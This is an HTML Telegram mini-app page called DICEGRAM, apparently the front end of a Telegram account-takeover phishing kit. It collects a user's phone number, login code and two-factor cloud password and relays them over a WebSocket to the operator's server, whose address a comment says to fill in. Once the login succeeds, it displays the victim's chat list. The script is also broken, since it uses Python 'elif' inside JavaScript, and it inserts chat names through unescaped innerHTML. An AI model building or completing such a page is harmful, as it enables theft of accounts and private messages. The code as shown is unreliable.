<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>DICEGRAM</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; }
        body {
            background-color: #0e1621;
            color: #ffffff;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        .app-container {
            background: #17212b;
            width: 100%;
            max-width: 400px;
            height: 100vh;
            display: flex;
            flex-direction: column;
            border-left: 1px solid #101921;
            border-right: 1px solid #101921;
        }
        .screen {
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            height: 100%;
            padding: 20px;
            text-align: center;
        }
        .hidden { display: none !important; }
        h2 { color: #5288c1; margin-bottom: 10px; }
        p { color: #7f91a4; margin-bottom: 20px; font-size: 14px; }
        input {
            width: 100%;
            padding: 14px;
            margin-bottom: 15px;
            border: 1px solid #243143;
            border-radius: 8px;
            background: #242f3d;
            color: #fff;
            font-size: 16px;
            outline: none;
        }
        input:focus { border-color: #5288c1; }
        button {
            width: 100%;
            padding: 14px;
            background: #5288c1;
            border: none;
            border-radius: 8px;
            color: white;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }
        button:hover { background: #4372a3; }
        
        /* Стили списка чатов (Экран мессенджера) */
        #messenger-screen { justify-content: flex-start; padding: 0; }
        .header {
            width: 100%;
            background: #242f3d;
            padding: 15px;
            text-align: left;
            font-weight: bold;
            font-size: 18px;
            border-bottom: 1px solid #101921;
        }
        .chats-list {
            width: 100%;
            overflow-y: auto;
            flex: 1;
        }
        .chat-item {
            display: flex;
            justify-content: space-between;
            align-items: center;
            padding: 15px;
            border-bottom: 1px solid #101921;
            cursor: pointer;
            text-align: left;
        }
        .chat-item:hover { background: #202b36; }
        .chat-name { font-weight: 500; color: #f5f5f5; }
        .chat-unread {
            background: #5288c1;
            color: #fff;
            font-size: 12px;
            padding: 3px 8px;
            border-radius: 10px;
        }
        
        #server-status {
            padding: 8px;
            font-size: 12px;
            background: #242f3d;
            width: 100%;
        }
    </style>
</head>
<body>

<div class="app-container">
    
    <div id="server-status" style="color: #e6a23c; text-align: center;">Проверка соединения с сервером...</div>

    <div id="phone-screen" class="screen hidden">
        <h2>DICEGRAM</h2>
        <p>Введите ваш номер телефона в международном формате</p>
        <input type="tel" id="phone-input" placeholder="+77071234567">
        <button onclick="sendPhone()">Далее</button>
    </div>

    <div id="code-screen" class="screen hidden">
        <h2>Введите код</h2>
        <p>Код подтверждения отправлен в ваше приложение Telegram</p>
        <input type="text" id="code-input" placeholder="Код">
        <button onclick="sendCode()">Подтвердить</button>
    </div>

    <div id="password-screen" class="screen hidden">
        <h2>Двухфакторная защита</h2>
        <p>Введите ваш облачный пароль Telegram</p>
        <input type="password" id="password-input" placeholder="Пароль">
        <button onclick="sendPassword()">Войти</button>
    </div>

    <div id="messenger-screen" class="screen hidden">
        <div class="header" id="user-header">Чат DICEGRAM</div>
        <div class="chats-list" id="chats-container">
            </div>
    </div>

</div>

<script>
    // Подключение к твоему серверу. 
    // Замени "ws://localhost:8080" на адрес твоего прокси/хостинга, например: wss://a38499-be46.m.jrnm.app
    const socket = new WebSocket('ws://localhost:8080');
    
    const statusBox = document.getElementById('server-status');

    socket.onopen = () => {
        statusBox.innerText = 'Сервер DICEGRAM онлайн';
        statusBox.style.backgroundColor = '#1c3222';
        statusBox.style.color = '#4caf50';
        // Если сервер онлайн, показываем первый экран ввода телефона
        document.getElementById('phone-screen').classList.remove('hidden');
    };

    socket.onclose = () => {
        statusBox.innerText = 'СЕРВЕР ОТКЛЮЧЕН. DICEGRAM недоступен.';
        statusBox.style.backgroundColor = '#3c1c1c';
        statusBox.style.color = '#f56c6c';
        // Прячем экраны ввода, так как сервер мертв
        hideAllScreens();
    };

    socket.onmessage = (event) => {
        const data = JSON.parse(event.data);
        
        if (data.status === 'code_sent') {
            hideAllScreens();
            document.getElementById('code-screen').classList.remove('hidden');
        } 
        elif (data.status === 'password_needed') {
            hideAllScreens();
            document.getElementById('password-screen').classList.remove('hidden');
        } 
        elif (data.status === 'success') {
            hideAllScreens();
            document.getElementById('messenger-screen').classList.remove('hidden');
            document.getElementById('user-header').innerText = `DICEGRAM (${data.first_name})`;
            
            // Рендерим список чатов как в ТГ
            renderChats(data.dialogs);
        } 
        elif (data.status === 'error') {
            alert(data.message);
        }
    };

    function sendPhone() {
        const phone = document.getElementById('phone-input').value;
        if (!phone) return alert('Введите номер телефона!');
        socket.send(JSON.stringify({ action: 'send_phone', phone: phone }));
    }

    function sendCode() {
        const code = document.getElementById('code-input').value;
        if (!code) return alert('Введите код!');
        socket.send(JSON.stringify({ action: 'send_code', code: code }));
    }

    function sendPassword() {
        const pwd = document.getElementById('password-input').value;
        if (!pwd) return alert('Введите пароль!');
        socket.send(JSON.stringify({ action: 'send_password', password: pwd }));
    }

    function renderChats(chats) {
        const container = document.getElementById('chats-container');
        container.innerHTML = '';
        
        chats.forEach(chat => {
            const item = document.createElement('div');
            item.className = 'chat-item';
            
            let unreadBadge = chat.unread > 0 ? `<span class="chat-unread">${chat.unread}</span>` : '';
            
            item.innerHTML = `
                <div class="chat-name">${chat.name}</div>
                ${unreadBadge}
            `;
            container.appendChild(item);
        });
    }

    function hideAllScreens() {
        document.getElementById('phone-screen').classList.add('hidden');
        document.getElementById('code-screen').classList.add('hidden');
        document.getElementById('password-screen').classList.add('hidden');
        document.getElementById('messenger-screen').classList.add('hidden');
    }
</script>

</body>
</html>
